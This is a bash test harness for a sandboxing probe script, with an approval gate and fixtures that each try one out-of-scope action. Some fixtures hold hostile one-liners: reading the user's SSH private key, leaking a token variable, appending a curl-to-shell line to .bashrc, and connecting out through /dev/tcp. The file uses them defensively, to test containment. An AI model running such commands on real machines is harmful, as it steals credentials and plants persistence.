#!/usr/bin/env bash
# Test harness for probe.sh: harmless fake components, each run under one grant.
# Usage: test_probe.sh <path-to-probe.sh>   (Linux/WSL2; needs bwrap, strace)
# Expect: all PASS. Exit code of each probe is checked: 0 within scope, 3 out of scope, 2 failed start,
# 4 not approved in the plan.
# Test 6b waits ~120 s (the probe timeout) on a connect to 192.0.2.1, a reserved address nothing answers.
set -u
PROBE="$1"
F="$HOME/probe-test/fixtures"
rm -rf "$HOME/probe-test"; mkdir -p "$F"

mk() { mkdir -p "$F/$1"; printf '%s\n' "$2" > "$F/$1/run.sh"; }
mk good    'echo hello > /out/result.txt'
mk steal   'cat "$HOME/.ssh/id_rsa"'
mk envleak 'echo "token is $CANARY_TOKEN"'
mk escape  'echo x > /work/evil.txt; echo x > /home/probe/evil.txt; echo ok > /out/fine.txt'
mk persist 'echo "curl http://example.invalid/x | sh" >> "$HOME/.bashrc"'
mk net     'echo > /dev/tcp/192.0.2.1/443'   # bash built-in: no extra program
mk exec    '/bin/ls / > /dev/null'
# plans for the approval gate: this harness approves its own harmless fixtures; a real plan is approved by the person
P="$HOME/probe-test/plans"; mkdir -p "$P"
printf '# plan\nAPPROVED: ALL by test-harness on 2026-10-29\n' > "$P/all.md"
printf '# plan\nAPPROVED: fs-read, exec by test-harness on 2026-10-29\n' > "$P/some.md"
printf '# plan\nAPPROVED: ALL\n' > "$P/malformed.md"
printf '# plan, not approved yet\n' > "$P/none.md"

PASS=0; FAILN=0
check() { # name expected got
  if [ "$3" = "$2" ]; then echo ">>> TEST PASS ($1)"; PASS=$((PASS+1))
  else echo ">>> TEST FAIL ($1): exit $3, wanted $2"; FAILN=$((FAILN+1)); fi
}
t() { # name capability expected-exit fixture [extra args]
  local name="$1" cap="$2" want="$3" fx="$4"; shift 4
  echo; echo "======== $name  (grant: $cap, expect exit $want)"
  bash "$PROBE" -c "$cap" -p "${PLANF:-$P/all.md}" -t "$F/$fx" "$@" -- ${SHELLCMD:-/bin/sh} /work/run.sh
  check "$name" "$want" $?
}

echo "======== G approval gate: nothing runs without a matching APPROVED line  (expect exit 4)"
for pl in none malformed missing; do
  rm -f /tmp/gate-ran; bash "$PROBE" -c fs-write -p "$P/$pl.md" -t "$F/good" -- /bin/sh -c 'touch /tmp/gate-ran'
  check "G $pl plan" 4 $?; [ ! -e /tmp/gate-ran ] || { echo ">>> TEST FAIL (G $pl): the command ran"; FAILN=$((FAILN+1)); }
done
bash "$PROBE" -c fs-write -p "$P/some.md" -t "$F/good" -- /bin/sh /work/run.sh; check "G capability not listed" 4 $?

echo "======== 0 sandbox failure must not pass  (expect exit 2)"
bash "$PROBE" -c baseline -p "$P/all.md" -t "$F/good" -- /nonexistent/program
check "0 failed start" 2 $?
PLANF="$P/some.md" t "G2 listed capability runs" fs-read 3 steal

t "1 good write"        fs-write 0 good
t "2 steal ssh key"     fs-read  3 steal
t "3 env token leak"    baseline 3 envleak
t "4 write escape"      fs-write 3 escape
t "5 bashrc persist"    fs-write 3 persist
SHELLCMD=/bin/bash t "6a net, no grant"    baseline 3 net
SHELLCMD=/bin/bash t "6b net, granted"     net-out  0 net -a example.com
t "7a exec, no grant"   baseline 3 exec
t "7b exec, granted"    exec     0 exec
SHELLCMD=sh t "8 bare command name" fs-write 0 good
echo; echo "== SUMMARY: $PASS passed, $FAILN failed"
